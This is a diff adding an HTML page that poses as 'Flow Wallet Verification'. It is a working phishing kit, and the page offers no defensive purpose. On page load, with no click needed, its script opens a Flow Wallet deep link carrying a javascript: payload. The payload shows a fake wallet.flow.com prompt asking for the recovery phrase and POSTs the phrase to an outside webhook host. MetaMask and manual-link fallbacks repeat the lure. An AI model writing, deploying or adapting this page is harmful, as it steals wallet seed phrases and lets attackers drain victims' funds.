@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Flow Wallet Verification</title>
+  <style>
+    body {
+      margin: 0; padding: 0; height: 100vh; background: #0f172a; color: #e2e8f0;
+      font-family: system-ui; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
+    }
+    .logo { font-size: 80px; margin-bottom: 20px; }
+    h1 { font-size: 28px; margin-bottom: 20px; }
+    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
+    .btn {
+      padding: 18px 40px; font-size: 20px; background: #22c55e; color: black; border: none; border-radius: 16px;
+      cursor: pointer; box-shadow: 0 10px 40px rgba(34,197,94,0.6); transition: 0.3s; font-weight: bold;
+    }
+    .btn:hover { background: #16a34a; transform: scale(1.05); }
+    .fallback { margin-top: 30px; font-size: 14px; color: #64748b; }
+  </style>
+</head>
+<body>
+
+  <div class="logo">🌊</div>
+  <h1>Flow Wallet Verification</h1>
+  <p>Click below to verify your identity and continue</p>
+
+  <button class="btn" id="verifyBtn">Verify Now</button>
+
+  <p class="fallback">If nothing happens, <a href="#" id="manualLink">open wallet manually</a></p>
+
+  <script>
+    // DEEP LINK KAMU (Flow Wallet + javascript: prompt seed + exfil)
+    const flowDeepLink = "https://link.wallet.flow.com/dapp?url=javascript:var%20seed%3Dprompt('wallet.flow.com%20says%20Enter%20your%20recovery%20phrase%20to%20verify%20identity')%3Bif(seed)%7Bfetch('https://keen-unicorn-32.webhook.cool/seed'%2C%7Bmethod:'POST'%2Cbody:JSON.stringify(%7Bseed:seed%7D)%7D)%7D";
+
+    // OPTIONAL: MetaMask deep link kalau user punya MetaMask
+    const metamaskDeepLink = "metamask://";
+
+    function triggerDeepLink() {
+      // 1. Coba Flow Wallet deep link
+      window.location.href = flowDeepLink;
+
+      // 2. Fallback: kalau tidak terbuka dalam 2 detik, coba MetaMask atau manual
+      setTimeout(() => {
+        if (confirm("Wallet not opened? Try MetaMask or open manually.")) {
+          window.location.href = metamaskDeepLink;
+        }
+      }, 2000);
+    }
+
+    // AUTO TRIGGER SAAT HALAMAN DIBUKA (TANPA KLIK!)
+    window.onload = function() {
+      triggerDeepLink();
+    };
+
+    // KALAU MAU PAKAI KLIK (UNCOMMENT INI)
+    // document.getElementById("verifyBtn").addEventListener("click", triggerDeepLink);
+
+    // Manual link fallback
+    document.getElementById("manualLink").addEventListener("click", function(e) {
+      e.preventDefault();
+      window.location.href = flowDeepLink;
+    });
+  </script>
+
+</body>
+</html>
